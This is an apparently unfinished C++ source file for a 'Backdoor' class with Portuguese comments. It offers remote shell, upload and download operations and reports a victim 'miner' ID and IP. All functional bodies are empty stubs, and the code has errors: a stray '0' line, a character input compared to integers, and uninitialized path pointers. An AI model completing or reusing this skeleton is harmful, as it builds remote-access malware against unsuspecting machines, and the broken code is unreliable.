#include "backdoor.h"

void Backdoor::shell(){
    if(this->is_server){

    }else{

    }
}


void Backdoor::upload(char * path){
    if(this->is_server){

    }else{

    }
}


void Backdoor::download(char *path){
    if(this->is_server){

    }else{

    }
}


std::string Backdoor::get_miner_id(){
    // Logica para pegar ID
}


std::string Backdoor::get_miner_ip(){
    // Logica para pegar IP
}


void Backdoor::menu(){
    int choice;
    std::cout << "MINER_ID = " << c->connection_id() << "IP = \n" << c->connection_ip() << std::endl;
0
    std::cout << "Operações : " << std::endl;

    std::cout << "1) Shell\n2) Download\n3)Upload" << std::endl;

    choice = std::cin.get();


    if(choice == 1){
        this->shell();
    
    }else if(choice == 2){
        char * path;
         // Get path

        this->download(path);


    }else if(choice == 3){
        char *path;
    
        this->upload(path);
    
    }else{
        std::cout << "Comando inválido" << std::endl;
    }
}


Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
    this->sock = sock;
    this->c  = c;
    this->is_server = is_server;
    this->client_ip = ip;
}
